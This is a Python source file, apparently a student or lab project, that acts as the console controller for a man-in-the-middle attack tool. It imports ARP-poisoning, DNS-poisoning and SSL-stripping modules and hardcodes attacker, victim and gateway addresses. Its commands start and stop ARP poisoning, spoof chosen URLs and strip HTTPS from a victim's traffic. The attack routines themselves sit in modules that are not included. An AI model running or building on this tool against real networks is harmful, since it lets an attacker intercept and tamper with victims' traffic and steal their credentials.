import threading

from dnsPoison import *
from arpPoison import *
from sslStripping import *
from setup import *

hwA,hwV,hwG,ipV,ipG = "attacker MAC","victim MAC","gateway MAC","victim IP","gateway IP"

urlsToSpoof = {} 
a = {hwA:"08:00:27:53:b4:c8",hwV:"08:00:27:fe:5c:2e",hwG:"52:54:00:12:35:00",ipV:"10.0.2.5",ipG:"10.0.2.1"}
interface = "enp0s9"

print("")
print("Welcome to the tool, this tool is a console style tool.")
print("For the list of commands use the command 'help'")
print("For more info on a command use the command 'help [command]'")
print("to close or reset the tool, use the input 'ctrl+c'")

mimLive,owpLive = threading.Event(),threading.Event()

showAddrs(a)
showUrlsToSpoof(urlsToSpoof)
interface = getInterface(interface)
threads = updateThreads([None,None],a,interface,mimLive,owpLive)


runner = True

while runner:
 
    user_in = raw_input("\n>>> ")
        
    if(user_in == "help"):
        print("")
        print("Here is a list of commands you can use:")
        print("help\nhelp [command]\nmimattack\nonewaypoisoning\nshowaddrs\nsetaddrs\nshowurls\naddurls\nreseturls\ndnspoisoning\nsslstripping\nsslstatus\nstopssl")
    
    elif(user_in == "help help"):
        print("")
        print("'help' command is used to list all the commands available to user.")
        print("it can also be used in the format 'help [command]' to get more info on the specified command.")
        
    elif(user_in == "mimattack"):
        mimLive = threading.Event()
        threads[0].start()
        
    elif(user_in == "stopmimattack"):
        mimLive.set()

    elif(user_in == "onewaypoisoning"):
        owpLive = threading.Event()
        threads[1].start()

    elif(user_in == "stoponewaypoisoning"):
        owpLive.set()

    elif(user_in == "showurls"):
        showUrlsToSpoof(urlsToSpoof)

    elif(user_in == "addurls"):
        urlsToSpoof = inputUrlsToSpoof(urlsToSpoof)

    elif(user_in == "reseturls"):
        urlsToSpoof = {}

    elif(user_in == "showaddrs"):
        showAddrs(a)

    elif(user_in == "setaddrs"):
        a = safeAddAddrs(a,threads)
        threads = updateThreads(threads,a,interface,mimLive,owpLive)

    elif(user_in == "dnspoisoning"):
        dnsPoisoning(interface,a,urlsToSpoof)
        
    elif(user_in == "sslstripping"):
        sslStripping()
        dnsPoisoning(interface,a,urlsToSpoof)

    elif(user_in == "sslstrippingstatus"):
        displayStatus()

    elif(user_in == "stopsslstripping"):
        stopStripping()

    elif(user_in == "quit"):
        print("")
        mimLive.set()
        owpLive.set()
        runner = False

    else:
        print("Command not found")
        print("For the list of commands use the command 'help'")